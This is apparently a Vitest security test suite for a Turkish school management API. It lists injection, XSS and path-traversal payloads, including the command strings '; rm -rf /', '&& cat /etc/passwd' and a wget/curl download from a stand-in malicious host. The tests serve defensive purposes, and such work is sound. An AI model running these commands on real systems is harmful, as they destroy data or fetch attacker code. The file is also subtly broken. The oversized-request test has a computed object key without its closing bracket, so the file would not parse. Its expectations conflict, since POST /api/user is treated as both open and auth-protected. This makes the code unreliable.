import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import request from 'supertest';
import { app } from '../../index';
import { connectDB, closeDB } from '../../db';
import { User } from '../../models';

// Test database setup
beforeEach(async () => {
  await connectDB();
  // Clear test data
  await User.deleteMany({});
});

afterEach(async () => {
  await closeDB();
});

describe('Security Tests', () => {
  describe('Input Validation and Sanitization', () => {
    it('should prevent SQL injection attempts', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --",
        "' UNION SELECT * FROM users --",
        "'; UPDATE users SET sifre='hacked'; --",
        "' OR 1=1--",
        "'; EXEC xp_cmdshell('dir'); --",
        "'; SELECT * FROM information_schema.tables; --"
      ];

      for (const payload of sqlInjectionPayloads) {
        const response = await request(app)
          .post('/api/user')
          .send({
            id: payload,
            adSoyad: 'SQL Injection Test',
            email: 'test@example.com',
            rol: 'student'
          });

        // Should not crash and should return proper error response
        expect(response.status).toBe(400);
        expect(response.body).toHaveProperty('error');
      }
    });

    it('should prevent XSS attacks', async () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        '<img src="x" onerror="alert(1)">',
        'javascript:alert("xss")',
        '<svg onload="alert(1)">',
        '"><script>alert("xss")</script>',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<object data="javascript:alert(1)"></object>',
        '<embed src="javascript:alert(1)"></embed>',
        '<form action="javascript:alert(1)"></form>',
        '<input onfocus="alert(1)">',
        '<textarea onblur="alert(1)"></textarea>',
        '<select onchange="alert(1)"></select>',
        '<button onclick="alert(1)">Click me</button>',
        '<link rel="stylesheet" href="javascript:alert(1)">',
        '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
        '<style>@import "javascript:alert(1)";</style>'
      ];

      for (const payload of xssPayloads) {
        const response = await request(app)
          .post('/api/user')
          .send({
            id: 'xss123',
            adSoyad: payload,
            email: 'xss@example.com',
            rol: 'student'
          });

        // Should sanitize input and not crash
        expect(response.status).toBe(201);
        // The payload should be sanitized
        expect(response.body.adSoyad).not.toContain('<script>');
        expect(response.body.adSoyad).not.toContain('javascript:');
        expect(response.body.adSoyad).not.toContain('onerror=');
        expect(response.body.adSoyad).not.toContain('onclick=');
      }
    });

    it('should prevent NoSQL injection attempts', async () => {
      const nosqlInjectionPayloads = [
        { $gt: '' },
        { $ne: null },
        { $where: 'function() { return true; }' },
        { $regex: '.*' },
        { $exists: true },
        { $type: 'string' },
        { $in: ['admin', 'user'] },
        { $nin: ['student'] },
        { $all: ['admin'] },
        { $elemMatch: { $gt: 0 } }
      ];

      for (const payload of nosqlInjectionPayloads) {
        const response = await request(app)
          .post('/api/user')
          .send({
            id: 'nosql123',
            adSoyad: 'NoSQL Injection Test',
            email: payload,
            rol: 'student'
          });

        // Should not crash and should return proper error response
        expect(response.status).toBe(400);
        expect(response.body).toHaveProperty('error');
      }
    });

    it('should prevent command injection attempts', async () => {
      const commandInjectionPayloads = [
        '; ls -la',
        '&& cat /etc/passwd',
        '| whoami',
        '`id`',
        '$(whoami)',
        '; rm -rf /',
        '&& wget http://malicious.com/script.sh',
        '| curl http://malicious.com/script.sh'
      ];

      for (const payload of commandInjectionPayloads) {
        const response = await request(app)
          .post('/api/user')
          .send({
            id: 'cmd123',
            adSoyad: payload,
            email: 'cmd@example.com',
            rol: 'student'
          });

        // Should not crash and should return proper error response
        expect(response.status).toBe(400);
        expect(response.body).toHaveProperty('error');
      }
    });
  });

  describe('Rate Limiting', () => {
    it('should limit repeated login attempts', async () => {
      const loginData = {
        id: 'ratelimit123',
        sifre: 'wrongpassword'
      };

      // Make multiple failed login attempts
      for (let i = 0; i < 5; i++) {
        await request(app)
          .post('/api/auth/login')
          .send(loginData)
          .expect(401);
      }

      // The next attempt should be rate limited
      const response = await request(app)
        .post('/api/auth/login')
        .send(loginData);

      expect(response.status).toBe(429); // Too Many Requests
      expect(response.body).toHaveProperty('error');
      expect(response.body.error).toContain('rate limit');
    });

    it('should limit repeated registration attempts', async () => {
      const userData = {
        id: 'ratereg123',
        adSoyad: 'Rate Limit User',
        email: 'rate@example.com',
        rol: 'student',
        sifre: 'password123'
      };

      // Make multiple registration attempts
      for (let i = 0; i < 10; i++) {
        await request(app)
          .post('/api/user')
          .send({ ...userData, id: `ratereg${i}` })
          .expect(201);
      }

      // The next attempt should be rate limited
      const response = await request(app)
        .post('/api/user')
        .send({ ...userData, id: 'ratereg11' });

      expect(response.status).toBe(429); // Too Many Requests
      expect(response.body).toHaveProperty('error');
      expect(response.body.error).toContain('rate limit');
    });

    it('should limit file upload attempts', async () => {
      // Create a test user first
      const user = await User.create({
        id: 'upload123',
        adSoyad: 'Upload User',
        email: 'upload@example.com',
        rol: 'student'
      });

      // Simulate multiple file upload attempts
      for (let i = 0; i < 10; i++) {
        await request(app)
          .post('/api/upload')
          .attach('file', Buffer.from('test file content'), 'test.txt')
          .expect(200);
      }

      // The next attempt should be rate limited
      const response = await request(app)
        .post('/api/upload')
        .attach('file', Buffer.from('test file content'), 'test11.txt');

      expect(response.status).toBe(429); // Too Many Requests
      expect(response.body).toHaveProperty('error');
      expect(response.body.error).toContain('rate limit');
    });
  });

  describe('Authentication and Authorization', () => {
    it('should reject requests without authentication', async () => {
      const protectedEndpoints = [
        { method: 'GET', path: '/api/user' },
        { method: 'POST', path: '/api/user' },
        { method: 'PUT', path: '/api/user/123' },
        { method: 'DELETE', path: '/api/user/123' },
        { method: 'GET', path: '/api/auth/me' },
        { method: 'POST', path: '/api/auth/logout' }
      ];

      for (const endpoint of protectedEndpoints) {
        const response = await request(app)
          [endpoint.method.toLowerCase()](endpoint.path)
          .expect(401);

        expect(response.body).toHaveProperty('error');
        expect(response.body.error).toContain('token');
      }
    });

    it('should reject requests with invalid tokens', async () => {
      const invalidTokens = [
        'invalid-token',
        'Bearer invalid-token',
        'Bearer ',
        'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid',
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature'
      ];

      for (const token of invalidTokens) {
        const response = await request(app)
          .get('/api/auth/me')
          .set('Authorization', token)
          .expect(401);

        expect(response.body).toHaveProperty('error');
        expect(response.body.error).toContain('token');
      }
    });

    it('should enforce role-based access control', async () => {
      // Create test users with different roles
      const student = await User.create({
        id: 'student123',
        adSoyad: 'Student User',
        email: 'student@example.com',
        rol: 'student'
      });

      const teacher = await User.create({
        id: 'teacher123',
        adSoyad: 'Teacher User',
        email: 'teacher@example.com',
        rol: 'teacher'
      });

      const admin = await User.create({
        id: 'admin123',
        adSoyad: 'Admin User',
        email: 'admin@example.com',
        rol: 'admin'
      });

      // Test that students cannot access admin endpoints
      const studentResponse = await request(app)
        .get('/api/admin/users')
        .set('Authorization', `Bearer ${student.id}`)
        .expect(403);

      expect(studentResponse.body).toHaveProperty('error');
      expect(studentResponse.body.error).toContain('yetkiniz yok');

      // Test that teachers cannot access admin endpoints
      const teacherResponse = await request(app)
        .get('/api/admin/users')
        .set('Authorization', `Bearer ${teacher.id}`)
        .expect(403);

      expect(teacherResponse.body).toHaveProperty('error');
      expect(teacherResponse.body.error).toContain('yetkiniz yok');

      // Test that admins can access admin endpoints
      const adminResponse = await request(app)
        .get('/api/admin/users')
        .set('Authorization', `Bearer ${admin.id}`)
        .expect(200);

      expect(adminResponse.body).toHaveProperty('users');
    });
  });

  describe('Data Validation', () => {
    it('should validate email format', async () => {
      const invalidEmails = [
        'invalid-email',
        'test@',
        '@example.com',
        'test..test@example.com',
        'test@example..com',
        'test@.com',
        'test@example.',
        'test test@example.com',
        'test@test test.com'
      ];

      for (const email of invalidEmails) {
        const response = await request(app)
          .post('/api/user')
          .send({
            id: 'email123',
            adSoyad: 'Email Test User',
            email,
            rol: 'student'
          })
          .expect(400);

        expect(response.body).toHaveProperty('error');
        expect(response.body.error).toBe('Validation failed');
      }
    });

    it('should validate role values', async () => {
      const invalidRoles = [
        'invalid-role',
        'admin123',
        'student_',
        'teacher.',
        'parent-',
        'hizmetli123',
        'superadmin',
        'guest'
      ];

      for (const role of invalidRoles) {
        const response = await request(app)
          .post('/api/user')
          .send({
            id: 'role123',
            adSoyad: 'Role Test User',
            email: 'role@example.com',
            rol: role
          })
          .expect(400);

        expect(response.body).toHaveProperty('error');
        expect(response.body.error).toBe('Validation failed');
      }
    });

    it('should validate class and section values', async () => {
      const invalidClasses = ['13', '8', '0', 'invalid'];
      const invalidSections = ['G', 'H', '1', 'invalid'];

      for (const invalidClass of invalidClasses) {
        const response = await request(app)
          .post('/api/user')
          .send({
            id: 'class123',
            adSoyad: 'Class Test User',
            email: 'class@example.com',
            rol: 'student',
            sinif: invalidClass
          })
          .expect(400);

        expect(response.body).toHaveProperty('error');
        expect(response.body.error).toBe('Validation failed');
      }

      for (const invalidSection of invalidSections) {
        const response = await request(app)
          .post('/api/user')
          .send({
            id: 'section123',
            adSoyad: 'Section Test User',
            email: 'section@example.com',
            rol: 'student',
            sinif: '10',
            sube: invalidSection
          })
          .expect(400);

        expect(response.body).toHaveProperty('error');
        expect(response.body.error).toBe('Validation failed');
      }
    });
  });

  describe('Request Size and Content Validation', () => {
    it('should reject oversized requests', async () => {
      // Create a very large payload
      const largePayload = {
        id: 'large123',
        adSoyad: 'Large User',
        email: 'large@example.com',
        rol: 'student',
        // Add many fields to exceed size limit
        ...Array.from({ length: 10000 }, (_, i) => ({ [`field${i}`: `value${i}` })).reduce((acc, curr) => ({ ...acc, ...curr }), {})
      };

      const response = await request(app)
        .post('/api/user')
        .send(largePayload)
        .expect(413); // Payload Too Large

      expect(response.body).toHaveProperty('error');
      expect(response.body.error).toBe('Request too large');
    });

    it('should reject malformed JSON', async () => {
      const response = await request(app)
        .post('/api/user')
        .send('invalid json content')
        .set('Content-Type', 'application/json')
        .expect(400);

      expect(response.body).toHaveProperty('error');
    });

    it('should reject requests with invalid content type', async () => {
      const response = await request(app)
        .post('/api/user')
        .send({ id: 'test123', adSoyad: 'Test User', email: 'test@example.com', rol: 'student' })
        .set('Content-Type', 'text/plain')
        .expect(400);

      expect(response.body).toHaveProperty('error');
    });
  });

  describe('Path Traversal Protection', () => {
    it('should prevent directory traversal attacks', async () => {
      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
        '....//....//....//etc/passwd',
        '..%2F..%2F..%2Fetc%2Fpasswd',
        '..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts'
      ];

      for (const payload of pathTraversalPayloads) {
        const response = await request(app)
          .get(`/api/files/${payload}`)
          .expect(400);

        expect(response.body).toHaveProperty('error');
        expect(response.body.error).toContain('Invalid path');
      }
    });
  });

  describe('CSRF Protection', () => {
    it('should require CSRF tokens for state-changing operations', async () => {
      const stateChangingEndpoints = [
        { method: 'POST', path: '/api/user' },
        { method: 'PUT', path: '/api/user/123' },
        { method: 'DELETE', path: '/api/user/123' },
        { method: 'POST', path: '/api/auth/logout' }
      ];

      for (const endpoint of stateChangingEndpoints) {
        const response = await request(app)
          [endpoint.method.toLowerCase()](endpoint.path)
          .send({})
          .expect(403); // Forbidden due to missing CSRF token

        expect(response.body).toHaveProperty('error');
        expect(response.body.error).toContain('CSRF');
      }
    });
  });
});
